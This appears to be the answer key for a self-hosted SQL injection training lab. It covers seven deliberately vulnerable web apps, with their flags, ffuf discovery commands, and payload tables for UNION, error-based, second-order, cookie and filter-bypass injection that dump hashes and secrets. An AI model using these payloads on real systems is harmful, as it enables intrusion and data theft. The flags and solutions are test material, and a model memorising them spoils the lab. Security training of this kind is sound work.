# SOLUTIONS — spoilers inside

| App | Path | Difficulty | DB |
|---|---|---|---|
| BookNook | /books | Easy | SQLite |
| StaffHub | /staff | Medium | MySQL |
| TicketDesk | /desk | Hard | MSSQL |
| RideShare | /rides | Hard | MySQL |
| DailyDispatch | /news | Hard | SQLite |
| SecureBank | /bank | Very hard | MSSQL |
| VaultDocs | /vault | Extreme | MySQL |

Self-tests: python3 solutions/verify_<app>.py http://127.0.0.1:5050 (prints PASS/FAIL only).

---

# BookNook (`/books`)

- **Difficulty:** Easy
- **Engine:** SQLite 3 (file `lab/data/booknook.db`)
- **Flag:** `FLAG{booknook_paper_lantern_ledger}` in table `partner_keys`, column `api_key`
- **Injection points:** (1) catalogue search `q`, (2) staff login `username` and `password`

## Discovery

- Home page has a search box -> `/books/catalogue?q=...`. Submitting a single quote returns a visible SQLite syntax error (`Search failed: near ...`). That confirms string-context injection.
- Footer link "Staff login" -> `/books/staff/login`. A quote in the username returns `Sign in failed: ...` with the error text.

## 1. Catalogue search (UNION, string context)

Query shape: `SELECT id, title, author, category, price FROM books WHERE title LIKE '%q%' OR author LIKE '%q%'`

1. Column count: `zzz' ORDER BY 5--` works, `ORDER BY 6--` errors. Result: 5 columns. (Or probe with `UNION SELECT 1,2,3,4,5--`.)
2. Reflected columns: 2, 3, 4 and 5 are printed in the table (column 1 only forms the link).
3. Version: `zzz' UNION SELECT 1,sqlite_version(),3,4,5--`
4. Tables: `zzz' UNION SELECT 1,group_concat(name),3,4,5 FROM sqlite_master WHERE type='table'--`
   Tables: books, customers, orders, reviews, staff, legacy_staff, coupons, partner_keys, subscribers, messages
5. Columns: `zzz' UNION SELECT 1,group_concat(name),3,4,5 FROM pragma_table_info('partner_keys')--`
   (or `SELECT 1,sql,3,4,5 FROM sqlite_master WHERE name='partner_keys'--`)
6. Rows / flag: `zzz' UNION SELECT 1,partner,api_key,4,5 FROM partner_keys--`
   Credentials: `zzz' UNION SELECT 1,username,password,4,5 FROM staff--`

## 2. Staff login (authentication bypass + UNION)

Query shape: `SELECT id, username, fullname, role FROM staff WHERE username = '<u>' AND password = '<p>'`

- Bypass: username `admin'--` (any password), or `' OR 1=1--`. Logs in as the first row (the admin account).
- The dashboard prints "Signed in as <fullname> (<role>)" using the 3rd and 4th selected columns, so UNION works here too:
  - Username `x' UNION SELECT 1,2,sqlite_version(),4--` -> version appears in the banner.
  - `x' UNION SELECT 1,2,(SELECT group_concat(name) FROM sqlite_master WHERE type='table'),4--` -> tables.
  - `x' UNION SELECT 1,2,(SELECT group_concat(name) FROM pragma_table_info('partner_keys')),4--` -> columns.
  - `x' UNION SELECT 1,2,(SELECT group_concat(api_key) FROM partner_keys),4--` -> flag.
- Stacked queries are not possible (Python's sqlite3 refuses them).

## Rabbit holes (all safe)

1. `/books/book?id=` : looks like the classic numeric id, but it is validated as digits and the query is parameterised. A quote just gives "could not be found".
2. `/books/catalogue?category=` and `?sort=` : category is a bound parameter; `sort` is a whitelist lookup. Quotes give "No titles matched" / are ignored.
3. `/books/staff/orders?status=` (after login) : parameterised filter.
4. `/books/staff/backup` and `/books/backup`, `/books/admin` : the backup page lists archives whose download always returns 404 "Archive unavailable"; `/books/backup` is a 403; `/books/admin` redirects to the login.
5. Newsletter and contact forms : parameterised INSERTs.
6. Decoy tables: `legacy_staff` (old logins that do not work), `coupons` (fake codes).

---

# StaffHub (`/staff`)

- **Difficulty:** Medium
- **Engine:** MySQL 8.0 (database `staffhub`, runtime user has only SELECT/INSERT/UPDATE/DELETE)
- **Flag:** `FLAG{staffhub_granite_signal_ledger}` in table `it_secrets`, column `secret` (row `Backup vault`)
- **Injection points:** (1) `/staff/profile?id=` numeric context behind a weak blacklist, (2) `/staff/helpdesk` POST (INSERT) fields `name`, `subject`, `message`
- **Site:** fully public intranet (no login, no sign-up). Everything is reachable by browsing; there is nothing hidden.

## Discovery

- Directory (`/staff/directory`) and the home page link each person to `/staff/profile?id=N`.
- `id=1'` returns `Could not load profile: You have an error in your SQL syntax...` (visible MySQL error). `id=1 and 1=2` returns no profile, `id=1 and 1=1` returns it, so it is numeric context with no quotes needed.
- `id=1 union select 1` returns `Invalid employee reference.` -> a blacklist exists. Blocked (case-sensitive substring match): `union`, `select`, `from`, `information_schema`, `sleep`, `benchmark`, `load_file`, `outfile`, `--`, `#`.
- Bypass: change the case (`UnIoN SeLeCt`, `FrOm`, `INFORMATION_SCHEMA`). Comments are not needed in numeric context (the query ends after `id = <input>`).
- Helpdesk form (`/staff/helpdesk`): a quote in name/subject/message gives `We could not log your request: <MySQL error>`.

## 1. Profile `id` (UNION or error-based)

Query: `SELECT id, full_name, job_title, department, email, phone, office, bio FROM employees WHERE id = <id>` (8 columns; the first row is printed, all columns reflected, `full_name` is the page heading).

UNION (use a non-existent id so only the injected row shows):
- Version: `-1 UnIoN SeLeCt 1,version(),3,4,5,6,7,8`
- Tables: `-1 UnIoN SeLeCt 1,group_concat(table_name),3,4,5,6,7,8 FrOm INFORMATION_SCHEMA.tables WHERE table_schema=database()`
  Tables: accounts, announcements, departments, employees, it_secrets, leave_requests, old_hr_logins, payroll_archive, tickets
- Columns: `-1 UnIoN SeLeCt 1,group_concat(column_name),3,4,5,6,7,8 FrOm INFORMATION_SCHEMA.columns WHERE table_schema=database() AND table_name=0x69745f73656372657473` (hex of `it_secrets`; quotes also work: `table_name='it_secrets'`)
- Flag: `-1 UnIoN SeLeCt 1,group_concat(system_name,0x3a,secret),3,4,5,6,7,8 FrOm it_secrets`
- Credential-like rows: `-1 UnIoN SeLeCt 1,group_concat(username,0x3a,password),3,4,5,6,7,8 FrOm accounts` (passwords are MD5 hashes); `old_hr_logins` holds plaintext legacy logins.

Error-based (XPATH errors show up to 32 characters, so page through with `substr`):
- `1 and extractvalue(1,concat(0x7e,(SeLeCt version())))`
- `1 and extractvalue(1,concat(0x7e,substr((SeLeCt group_concat(table_name) FrOm INFORMATION_SCHEMA.tables WHERE table_schema=database()),1,31)))` then offsets 32, 63, ...
- Same pattern for columns and for `secret` of `it_secrets`.

## 2. Helpdesk INSERT (error-based)

Query: `INSERT INTO tickets (ref, requester, category, subject, message, status, created_at) VALUES ('<ref>', '<name>', '<category>', '<subject>', '<message>', 'open', NOW())`
`category` is validated against a whitelist; name, subject and message are concatenated.

Payload (put it in `subject`, `name` or `message`; the other fields can be normal text):
`' or extractvalue(1,concat(0x7e,(select version()))) or '`
- Tables: `' or extractvalue(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,31))) or '` (then offset 32, 63, ...)
- Columns: same with `information_schema.columns ... table_name='it_secrets'`
- Flag: `' or extractvalue(1,concat(0x7e,substr((select group_concat(secret) from it_secrets),1,31))) or '`
- Notes: the lowercase blacklist does NOT apply here. Start the payload with an empty string `'` (as shown). A non-numeric prefix such as `z'` makes MySQL fail on the string-to-number conversion before the subquery runs. Each failed attempt is rejected, so nothing is stored. A successful normal submission shows a `REQ-xxxx` reference.

## Rabbit holes (all safe)

Visible, data-fetching, look injectable:
1. `/staff/directory?dept=` : bound parameter ("No employees found"). `?page=` is digit-validated and falls back with "Invalid page number" (looks like an error handler for a quote).
2. `/staff/search?q=` : rejects quotes with "Search terms may only contain letters, numbers and spaces" and uses bound LIKE parameters anyway.
3. `/staff/helpdesk/track?ref=` : bound parameter ("No request found").
4. `/staff/news?id=` : digits only (otherwise a generic "could not be found"), then bound.

Dead ends:
- `/staff/admin`, `/staff/admin/`, `/staff/backup` : static 403 pages. There is no login anywhere.
- `/staff/directory/print` (printable edition "not available"), `/staff/handbook` (moved), `/staff/about`, `/staff/contact` (static).
- Decoy tables: `payroll_archive` (fake IBANs/gross pay), `old_hr_logins` (disabled accounts), `leave_requests`; `employees.salary` is not displayed anywhere.

---

# TicketDesk (`/desk/`)

- **Difficulty:** Hard
- **Engine:** Microsoft SQL Server 2022 (database `ticketdesk`)
- **Technique:** error-based SQL injection in the ORDER BY context of a HIDDEN parameter `orderby` on `GET /desk/api/tickets` (UNION is not possible there)
- **Flag table:** `service_accounts` (flag is in the `secret` column of the `svc_join` row)
- **Site:** fully public IT support site (no login, no tokens). Pages are HTML shells that call a public JSON API from small inline scripts.

## Where the injection is

`GET /desk/api/tickets?orderby=<expr>`. Only when `orderby` is present, its value is concatenated into `... ORDER BY <expr> OFFSET ... FETCH NEXT 10 ROWS ONLY`, and a database failure then returns HTTP 500 with the engine message in the JSON field `detail`. Without the parameter, no database error text is ever shown.
The UI never sends `orderby` and nothing in the HTML/JS references it.

Pre-filter on `orderby` (HTTP 400 "Invalid ordering"): length > 250, `;`, `--`, `/*`, and the words `union`, `waitfor`, `exec`, `xp_`, `insert`, `update`, `delete`, `drop`, `shutdown`.

## How a tester finds it

1. Browse: the pages call `/desk/api/tickets?status=..&page=..`, `/desk/api/ticket?id=`, `/desk/api/kb?q=`, `/desk/api/agents?team=`, `/desk/api/stats?period=` (visible in the page source).
2. Fuzz parameter names on the list endpoint. Baseline `GET /desk/api/tickets` is 200 and a fixed size (1694 bytes in the stock data); unknown params are ignored, so filter on that size:
   `ffuf -u 'http://HOST:5050/desk/api/tickets?FUZZ=1' -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs 1694`
   Hits: `status`, `priority`, `q` (visible, validated - 400s / different size) and `orderby` (200, different size because the response now carries an `order_by` field).
3. `orderby=foo` -> 500 with `detail: "Invalid column name 'foo'."`: the value is being used as SQL. `orderby=1` works (orders by the first column). `orderby=1 union select 1` -> 400 (filtered, and UNION is not valid in ORDER BY anyway), so use error-based extraction.

Quirk: an uncorrelated constant subquery such as `(SELECT CAST(@@version AS int))` is folded away by the optimiser and never raises. Use the bare `CAST(@@version AS int)`, or a subquery that reads a table. Make sure the other filters (`status`, `q`...) still match at least one ticket, otherwise no row is evaluated and no error occurs.

## Exploitation

Send each payload as `orderby` (URL-encode it). The data appears in `detail`: `Conversion failed when converting the nvarchar value '<DATA>' to data type int.`

| Goal | `orderby` value |
|---|---|
| Version | `CAST(@@version AS int)` |
| Current DB | `CAST(DB_NAME() AS int)` |
| Tables | `CAST((SELECT STRING_AGG(name,CHAR(44)) FROM sys.tables) AS int)` |
| Tables (one at a time) | `(SELECT TOP 1 CAST(name AS int) FROM sys.tables WHERE name NOT IN ('users'))` and extend the NOT IN list |
| Columns of `service_accounts` | `CAST((SELECT STRING_AGG(name,CHAR(44)) FROM sys.columns WHERE object_id=OBJECT_ID('service_accounts')) AS int)` |
| Same via information_schema | `CAST((SELECT STRING_AGG(column_name,CHAR(44)) FROM information_schema.columns WHERE table_name='service_accounts') AS int)` |
| Dump rows + flag | `CAST((SELECT STRING_AGG(CONCAT(system_name,CHAR(58),account,CHAR(58),secret),CHAR(124)) FROM service_accounts) AS int)` |
| Flag only | `(SELECT TOP 1 CAST(secret AS int) FROM service_accounts WHERE account='svc_join')` |
| Users | `CAST((SELECT STRING_AGG(CONCAT(username,CHAR(58),password_hash),CHAR(124)) FROM users) AS int)` |

If STRING_AGG output is too long, use `SELECT TOP 1 ... WHERE id=N` and walk the rows.

Flag: `FLAG{ticketdesk_amber_lantern_7c41}`

## Tables in the database
`users` (dummy hashes), `categories`, `tickets`, `comments`, `assets`, `knowledge_base`, `api_keys` (fake keys), `audit_log`, `tickets_archive`, `contact_messages`, `service_accounts` (flag).

## Hidden endpoints (found by ffuf, none are linked anywhere, none are injectable)

`ffuf -u 'http://HOST:5050/desk/api/FUZZ' -w /usr/share/wordlists/dirb/common.txt -mc all -fc 404` (also works with `raft-small-words.txt`) finds, besides the visible `agents`, `kb`, `stats`, `ticket`, `tickets`:
- `/desk/api/assets` : `?tag=` is bound, `?sort=` is mapped through a whitelist dictionary (400 "Unknown sort field"). A second `sort`-style parameter that looks promising but is dead.
- `/desk/api/categories` : static list.
- `/desk/api/users` : `?id=` digits only, bound; returns no hashes.
- `/desk/api/export` : `?id=` digits only, `?format=` whitelist (json/csv).
- `/desk/api/health` : static `{"status":"ok"}`.
- `/desk/api/reports`, `/desk/api/config`, `/desk/api/internal/...` : static 403 JSON. `/desk/api/v1/...` : 410 retired.
- `/desk/admin`, `/desk/backup` (`ffuf -u .../desk/FUZZ -w dirb/common.txt -fc 404`) : static 403 HTML.

## Other rabbit holes (all safe)
- Visible: `/desk/api/ticket?id=` (digits only, bound; quote -> generic 400), `/desk/api/kb?q=` (bound LIKE; quote -> empty list), `/desk/api/agents?team=` (bound; unknown team -> empty list), `/desk/api/stats?period=` (whitelist 7d/30d/90d/1y/all; anything else 400).
- `status`, `priority`, `q`, `page` on `/desk/api/tickets`: whitelist / regex validation, always a generic 400 "Invalid ...", no database detail. They look injectable and are not.
- `/desk/status` (static "all systems operational"), `/desk/contact` (parameterised insert), `/desk/about`.
- Decoy tables `api_keys`, `audit_log`, `tickets_archive`, plus the many fake service account passwords next to the flag.

---

# RideShare (`/rides/`) - solution notes

- **Difficulty:** Hard
- **Engine:** MySQL 8 (database `rideshare`)
- **Technique:** second-order SQL injection (stored value re-used unsafely later), UNION-based, in-band
- **Hidden parts:** the vulnerable endpoint (`/rides/digest`) and its parameter (`ref`) are not linked anywhere - found with ffuf
- **Flag table:** `ops_secrets` (row labelled "internal dashboard access", column `secret_value`)

There are no accounts, logins, cookies or API keys. The whole site is public.

## Where the injection is

1. The public form at `/rides/subscribe` ("Ride alerts": email, leaving from, going to) stores its values with a **parameterised INSERT**. Nothing is injectable there and quotes are accepted. The confirmation only says "Your alert number is N" - no link, no endpoint name.
2. A hidden page, `GET /rides/digest?ref=<alert number>`, loads the stored row (lookup by number is parameterised and numeric-only) and then builds a listing query by **concatenating the stored `from_city` text**:

```
SELECT id AS c1, origin AS c2, destination AS c3, depart_at AS c4, seats AS c5, price AS c6
FROM rides WHERE origin = '<from_city>' LIMIT 10
```

Six columns, all rendered in a table (c1..c6), so UNION output is visible. On a SQL error the page only says "This listing could not be prepared right now" (no error text), so use UNION, not error-based. The `to_city` and `email` values are only displayed (escaped).

The stored value is limited to 200 characters (payloads below are all shorter).

## How a tester finds it

1. Crawl the visible site: every visible `?param=` endpoint is a decoy (see below).
2. Fuzz for hidden pages (any of these list `digest`, `reviews`, `stats`):
   - `ffuf -u http://HOST:PORT/rides/FUZZ -w /usr/share/wordlists/dirb/common.txt`
   - `ffuf -u http://HOST:PORT/rides/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt`
   Unknown paths are 404; hidden pages are 200 (the visible-site 403/302 pages such as `admin`, `backup` are static dead ends).
3. `/rides/digest` alone returns a short "Nothing to show" page. Fuzz parameter names and filter the baseline size:
   - `ffuf -u 'http://HOST:PORT/rides/digest?FUZZ=1' -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs <size of /rides/digest>`
   - `ref` is the only name that changes the response. (`/rides/reviews` takes `id`, `/rides/stats` takes `city`; both are safe.)
4. `?ref=1` .. `?ref=8` show seeded alerts; each page echoes the stored "leaving from" text. Create your own alert at `/rides/subscribe` with a quote in "Leaving from" (e.g. `x'`), note the alert number, then open `/rides/digest?ref=<number>`: the page changes to "could not be prepared". The stored text is what breaks the query.

## Exploitation (put each payload in "Leaving from", then open `/rides/digest?ref=<new alert number>`)

Use a non-existent origin (`x`) so only injected rows come back. `-- -` ends the query (MySQL needs the space after `--`; `#` also works).

| Goal | "Leaving from" value |
|---|---|
| Column count | `x' ORDER BY 6-- -` works, `x' ORDER BY 7-- -` gives the error message |
| Version | `x' UNION SELECT 1,version(),3,4,5,6-- -` |
| Tables | `x' UNION SELECT 1,group_concat(table_name),3,4,5,6 FROM information_schema.tables WHERE table_schema=database()-- -` |
| Columns | `x' UNION SELECT 1,group_concat(column_name),3,4,5,6 FROM information_schema.columns WHERE table_name='ops_secrets'-- -` |
| Rows + flag | `x' UNION SELECT 1,label,secret_value,4,5,6 FROM ops_secrets-- -` |
| Credential-like rows | `x' UNION SELECT 1,username,password_hash,4,5,6 FROM admin_accounts-- -` |
| Driver hashes | `x' UNION SELECT 1,username,password_hash,4,5,6 FROM users-- -` |

Tables: `alerts`, `admin_accounts`, `cities`, `driver_payouts`, `messages`, `ops_secrets` (flag), `promo_codes`, `reviews`, `rides`, `users`.

Flag: `FLAG{rideshare_velvet_compass_3e90}`

## Rabbit holes (all safe)

Visible, linked from the HTML:
- `/rides/ride?id=` - digits only (`isdigit`) and a bound parameter; a quote gives "ride could not be found".
- `/rides/search?from=&to=` - city-name regex (letters, space, dot, hyphen); anything else gives "Please enter a valid city name"; the rest is a bound LIKE.
- `/rides/driver?name=` - bound parameter; a quote gives "No driver found".
- `/rides/city?name=` - regex + bound parameter; a quote gives "We do not have a city by that name".
- `/rides/browse?page=&sort=` - page is an int, sort is a whitelist.

Hidden but safe (found by ffuf, decoys):
- `/rides/reviews?id=` - numeric only, bound.
- `/rides/stats?city=` - regex + bound.
- On `/rides/digest` the `ref` value itself is numeric-only and bound; only the stored text is unsafe.

Dead ends: `/rides/admin`, `/rides/backup` (static 403), `/rides/old`, `/rides/timetable`, `/rides/terms` (static pages), the contact form (parameterised insert, output escaped), the alert form itself (safe at insert time).

---

# DailyDispatch (`/news/`) - solution notes

- **Difficulty:** Hard
- **Engine:** SQLite 3 (file `lab/data/dailydispatch.db`)
- **Technique:** cookie-based SQL injection (UNION, in-band) with whitespace + keyword filtering to bypass
- **Flag table:** `wire_services` (flag is in `api_key`, provider "Photo Archive")

No accounts, logins or API keys exist. The only cookie is `dd_prefs`, set by the site on the first visit.

## Where the injection is

Cookie `dd_prefs` (Path=/news) holds `urlsafe_base64(JSON)`, e.g. `{"ed":"intl","dm":"standard"}`. The `ed` (edition) value is concatenated into the home page query that feeds the sidebar block "Top stories for your edition":

`SELECT id, title, summary, category, published FROM articles WHERE edition = '<ed>' ORDER BY published DESC LIMIT 6`

Five columns; the sidebar shows title (col 2), category (col 4) and published (col 5), and the id (col 1) in the link. Errors show only "Top stories are not showing right now."

Filter, applied to `ed` after base64 + JSON decoding:
1. If it contains a space, tab, CR or LF, the value is discarded and the default edition is used (silently).
2. Otherwise the words `union`, `select`, `from`, `where` are removed once, case-insensitively (single pass, not recursive).

## How a tester finds it

- Look at the `Set-Cookie` header on the first response, decode the `dd_prefs` value (base64 -> JSON). Changing `dm` is validated; changing `ed` changes the sidebar (`us`, `uk`, `eu`, `asia`). The edition selector in the nav bar sets the same cookie (whitelisted at set time only).
- A quote in `ed` breaks the sidebar ("not showing right now"), proving injection. Spaces are silently ignored (fallback), and UNION/SELECT keywords vanish.
- Bypasses: nest the keywords (`UNUNIONION`, `SELSELECTECT`, `FRFROMOM`, `WHWHEREERE`), and replace whitespace with `/**/` or with a form feed written as the JSON escape `\u000c` (SQLite treats form feed as whitespace; the check runs after decoding but only looks for space/tab/CR/LF). End with `--`.

## Exploitation

Build the JSON `{"ed":"<payload>","dm":"standard"}`, base64-url encode it, send as the `dd_prefs` cookie to `/news/`, read the sidebar. Payloads (`/**/` stands in for whitespace):

| Goal | `ed` value |
|---|---|
| Version | `x'/**/UNUNIONION/**/SELSELECTECT/**/1,sqlite_version(),3,4,5--` |
| Tables | `x'/**/UNUNIONION/**/SELSELECTECT/**/1,group_concat(name),3,4,5/**/FRFROMOM/**/sqlite_master/**/WHWHEREERE/**/type='table'--` |
| Columns | `x'/**/UNUNIONION/**/SELSELECTECT/**/1,group_concat(name),3,4,5/**/FRFROMOM/**/pragma_table_info('wire_services')--` |
| Columns (CREATE statement) | `...1,sql,3,4,5/**/FRFROMOM/**/sqlite_master/**/WHWHEREERE/**/name='wire_services'--` |
| Rows + flag | `x'/**/UNUNIONION/**/SELSELECTECT/**/1,group_concat(provider\|\|':'\|\|api_key,'\|'),3,4,5/**/FRFROMOM/**/wire_services--` |
| Editors (credential-like rows) | `...1,group_concat(username\|\|':'\|\|password_hash,'\|'),3,4,5/**/FRFROMOM/**/editors--` |

(`\|` is table escaping: the real characters are `||` and `'|'`.)

SQLite notes: no `information_schema` and no `version()`; use `sqlite_version()`, `sqlite_master`, `pragma_table_info()`, `group_concat()`, `||`. The table list also contains `sqlite_sequence`.

Flag: `FLAG{dailydispatch_copper_heron_58bd}`

## Tables
`editors` (username + password_hash), `categories`, `articles`, `subscribers`, `ad_campaigns`, `messages` (decoys), `wire_services` (flag), plus `sqlite_sequence`.

## Hidden pages (found by ffuf, safe decoys)

Not linked from any page, not in robots/sitemap:
- `/news/popular?section=<category slug>` - slug looked up with a bound parameter; unknown slug gives "No match".
- `/news/weekly?issue=<1-53>` - digits only, bound.

Find them with:
- `ffuf -u http://HOST:PORT/news/FUZZ -w /usr/share/wordlists/dirb/common.txt` (or `raft-small-words.txt`): unknown paths are 404, `popular` and `weekly` are 200.
- Parameter names: `ffuf -u 'http://HOST:PORT/news/popular?FUZZ=world' -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs <size of /news/popular>` finds `section`; the same with `/news/weekly?FUZZ=44` finds `issue`.

They are red herrings: neither reads the cookie and both use bound parameters. The real injection is the cookie.

## Rabbit holes (all safe)

Visible, linked from the HTML:
- `/news/section?cat=` - bound parameter; a quote gives "No such section".
- `/news/article?id=` - digits only, bound.
- `/news/search?q=` - quotes, semicolons and backslashes are rejected ("unsupported characters"); the rest is a bound LIKE.
- `/news/archive?year=` - four digits only, bound.
- `/news/author?name=` - bound parameter.
- `/news/feed.xml?cat=` - bound parameter.
- The `dm` field inside `dd_prefs`: whitelist (standard / compact / large).
- Only the home page reads the edition from the cookie; every other page ignores it.
- Contact and subscribe forms: parameterised inserts, output escaped.
- Dead ends: `/news/admin`, `/news/backup.zip`, `/news/db.sqlite` (static 403), `/news/old` (static page).

---

## SecureBank — `/bank` — VERY HARD — MSSQL (SQL Server 2022)

No login anywhere. The site is public (rates, branches, ATM finder, currency converter, about).

**Where:** hidden endpoint `POST /bank/api/statement` (JSON body), field **`to`**. It is not linked anywhere. The value is concatenated inside a quoted date literal at the end of the WHERE clause, just before `ORDER BY 1`.

**Discovery (ffuf)**
- Directory fuzz `/bank/FUZZ` with `dirb/common.txt` finds `api`. Fuzz `/bank/api/FUZZ`: `statement` answers **405** to GET (not 404), `status`, `history` answer 200/400.
- `ffuf -X POST -H 'Content-Type: application/json' -d '{"a":1}' -u http://HOST:5050/bank/api/statement` → `{"error":"invalid request"}`. Fuzz JSON keys with `burp-parameter-names.txt`: `account` changes the error (to "invalid account" / success when numeric). Use `account: 1`.
- With a valid account, fuzz further keys: `from`, `to`, `type`, `q` each change the response (invalid date / invalid type).

**Why it is hard**
- `from` is full-match validated; `to` is validated with a *prefix-only* date regex, so `to` must start with `YYYY-MM-DD` (a bare `'` gives "invalid date").
- A WAF on the **raw** request text blocks `union`, `select`, `--`, `/*`, `;`, `exec`, `xp_`, `sp_`, `insert`, `update`, `delete`, `drop`, `waitfor`, `declare`.
- DB errors are generic ("unable to retrieve statement") so error-based is not possible; the route is UNION.
- `q` (quote doubling), `type` (allow-list), `account` (int + existence check) are safe.

**Discovery of the injection:** `"to":"2024-12-31'"` → HTTP 500 (not 400) = value reaches SQL.

**WAF bypass:** the WAF scans the raw body but SQL sees the JSON-decoded value. Write blocked words as JSON unicode escapes, e.g. `UNION SELECT` (or escape every character). `--` can be `--`, or avoid comments by balancing quotes with `... WHERE '1'='1`.

**Columns / types:** the first query returns 4 columns `(date varchar, description nvarchar, amount decimal, ref varchar)`. Use `NULL` for 1, 3, 4; put text in column 2 (column 3 is numeric).

**Payloads** (`to` value, keywords escaped as above in the real request; `account` = 1):
```
version : 2024-12-31' UNION SELECT NULL,@@version,NULL,NULL WHERE '1'='1
tables  : 2024-12-31' UNION SELECT NULL,(SELECT STRING_AGG(table_name,',') FROM information_schema.tables),NULL,NULL WHERE '1'='1
columns : 2024-12-31' UNION SELECT NULL,(SELECT STRING_AGG(column_name,',') FROM information_schema.columns WHERE table_name='internal_notes'),NULL,NULL WHERE '1'='1
data    : 2024-12-31' UNION SELECT NULL,(SELECT STRING_AGG(note_key+'='+note_value,' | ') FROM internal_notes),NULL,NULL WHERE '1'='1
users   : 2024-12-31' UNION SELECT NULL,(SELECT STRING_AGG(username+':'+password_hash,' | ') FROM customers),NULL,NULL WHERE '1'='1
```
Real flag: `FLAG{securebank_unicode_escapes_slip_past_the_gate}` (row `core_banking_secret`; `decoy_token` is fake).

**Rabbit holes (visible, safe):** `/bank/rates?type=`, `/bank/branches?city=`, `/bank/branch?id=`, `/bank/atm?zip=` (any `'` gives a fake 500), `/bank/exchange?from=&to=&amount=` (allow-list). **Hidden but safe:** `/bank/api/history?account=` (int), `/bank/api/status`. **Dead ends:** `/bank/admin`, `/bank/backup`, `/bank/backup.zip`, `/bank/login` (static 403), `robots.txt` entries. Decoy tables `staff_users`, `audit_trail`; decoy row `decoy_token`.

---

## VaultDocs — `/vault` — EXTREME — MySQL 8.0

**Where:** hidden legacy endpoint **`GET /vault/api/v1/export?fields=...`** (header `X-API-Key`). `fields` is placed straight into the SELECT list: `SELECT <fields> FROM documents WHERE owner_id=<you> LIMIT 50`. Not quoted, so no quote is needed.

**Chain of preconditions**
1. Register (`POST /vault/api/v2/auth/register` → `api_key`) and send it as `X-API-Key` on every call.
2. Find the endpoint: it is not in any UI. The front-end script `/vault/static/app.js` contains a `legacyExport()` helper pointing at `/vault/api/v1/export`. (Recon: read the JS.)
3. Calling it returns `403 legacy export is not enabled for this account`. `GET /vault/api/v2/settings` lists `"legacy_export": false`; enable it with `PATCH /vault/api/v2/settings` body `{"legacy_export": true}`.
4. Now `/api/v1/export` works. It validates `fields` against an allow-list **only for the first three comma-separated items**, and rejects `'`, `"`, backtick and `;`. So: supply three valid fields (`title,created_at,size`) and put the injection in the 4th item.
5. No quotes allowed → use `database()`, hex literals (`0x...`) and `concat_ws(0x3a,...)`.

**Output:** the values come back in-band in the JSON `rows`, keyed by the expression text. Subqueries must return one row → use `group_concat`.

**Payloads** (`fields` value):
```
version : title,created_at,size,(select version())
tables  : title,created_at,size,(select group_concat(table_name) from information_schema.tables where table_schema=database())
columns : title,created_at,size,(select group_concat(column_name) from information_schema.columns where table_name=0x7661756c745f73656372657473)   -- hex('vault_secrets')
data    : title,created_at,size,(select group_concat(secret_name,0x3d,secret_value) from vault_secrets)
users   : title,created_at,size,(select group_concat(email,0x3a,password_hash) from users)
```
Real flag: `FLAG{vaultdocs_the_legacy_door_was_never_locked}` (row `signing_secret`; `decoy_flag` is a fake). Note the app user can only see this schema in `information_schema`.

**Rabbit holes:** `/vault/admin` (parameterised login); `/vault/api/v2/admin/*` (403); `/vault/robots.txt`; `/vault/backup.sql`, `/vault/.git/config` (404); `GET /vault/api/v2/export?fields=` (looks identical but strict allow-list on every item); `GET /vault/api/v2/documents?sort=` (allow-list map); `?tag=` and `?folder=` (parameterised); `GET /vault/api/v2/search?q=` (parameterised); `GET /vault/api/v2/audit?limit=` (int-cast); `v2/auth/*` (parameterised); tables `billing_accounts` (fake card tokens), `audit_log`, `share_links`, and the `decoy_flag` row.
